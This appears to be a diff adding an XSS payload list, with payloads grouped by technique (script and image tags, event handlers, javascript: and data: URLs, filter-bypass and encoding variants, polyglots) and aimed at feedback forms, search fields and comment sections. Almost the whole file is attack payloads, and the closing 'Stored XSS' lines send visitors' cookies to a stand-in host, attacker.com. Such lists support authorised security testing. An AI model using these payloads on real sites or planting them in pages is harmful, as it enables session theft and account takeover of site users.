@@ -1,0 +1,92 @@
+# XSS (Cross-Site Scripting) Payloads
+# Use these payloads to test XSS vulnerabilities
+# Target: Feedback forms, search fields, comment sections, any reflected user input
+
+# Basic Script Tags
+<script>alert('XSS')</script>
+<script>alert(document.cookie)</script>
+<script>alert(document.domain)</script>
+<script>alert(window.origin)</script>
+<script>console.log('XSS')</script>
+
+# Image Tag XSS
+<img src=x onerror=alert('XSS')>
+<img src=x onerror=alert(document.cookie)>
+<img src=x onerror=alert(1)>
+<img/src=x onerror=alert('XSS')>
+<img src="x" onerror="alert('XSS')">
+
+# SVG XSS
+<svg onload=alert('XSS')>
+<svg/onload=alert('XSS')>
+<svg><script>alert('XSS')</script></svg>
+<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>
+
+# Body Tag XSS
+<body onload=alert('XSS')>
+<body onpageshow=alert('XSS')>
+<body onfocus=alert('XSS')>
+
+# IFrame XSS
+<iframe src="javascript:alert('XSS')">
+<iframe src=javascript:alert('XSS')>
+<iframe onload=alert('XSS')>
+
+# Input Tag XSS
+<input onfocus=alert('XSS') autofocus>
+<input onblur=alert('XSS') autofocus><input autofocus>
+<input type="text" value="XSS" onfocus=alert('XSS') autofocus>
+
+# Other HTML Tags
+<marquee onstart=alert('XSS')>
+<details open ontoggle=alert('XSS')>
+<select onfocus=alert('XSS') autofocus>
+<textarea onfocus=alert('XSS') autofocus>
+<keygen onfocus=alert('XSS') autofocus>
+<video><source onerror="alert('XSS')">
+
+# Event Handlers
+<div onmouseover=alert('XSS')>Hover me</div>
+<div onclick=alert('XSS')>Click me</div>
+<a href="#" onmouseover=alert('XSS')>Link</a>
+<button onclick=alert('XSS')>Click</button>
+
+# JavaScript Protocol
+<a href="javascript:alert('XSS')">Click</a>
+<a href='javascript:alert("XSS")'>Click</a>
+<form action="javascript:alert('XSS')">
+
+# Data Protocol
+<a href="data:text/html,<script>alert('XSS')</script>">Click</a>
+<object data="data:text/html,<script>alert('XSS')</script>">
+
+# Filter Bypass Techniques
+<scr<script>ipt>alert('XSS')</scr</script>ipt>
+<ScRiPt>alert('XSS')</sCrIpT>
+<script>alert(String.fromCharCode(88,83,83))</script>
+<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>
+
+# Encoding Variations
+%3Cscript%3Ealert('XSS')%3C/script%3E
+&#60;script&#62;alert('XSS')&#60;/script&#62;
+\x3cscript\x3ealert('XSS')\x3c/script\x3e
+
+# Context Breaking
+'><script>alert('XSS')</script>
+"><script>alert('XSS')</script>
+</script><script>alert('XSS')</script>
+';alert('XSS');//
+";alert('XSS');//
+
+# DOM-Based XSS
+#<script>alert('XSS')</script>
+javascript:alert('XSS')
+<img src=x onerror=location='javascript:alert(document.cookie)'>
+
+# Polyglot XSS
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(document.cookie)</script>">
+
+# Stored XSS Specific
+<script>document.write('<img src="http://attacker.com/steal?cookie='+document.cookie+'">')</script>
+<img src=x onerror=this.src='http://attacker.com/steal?cookie='+document.cookie>
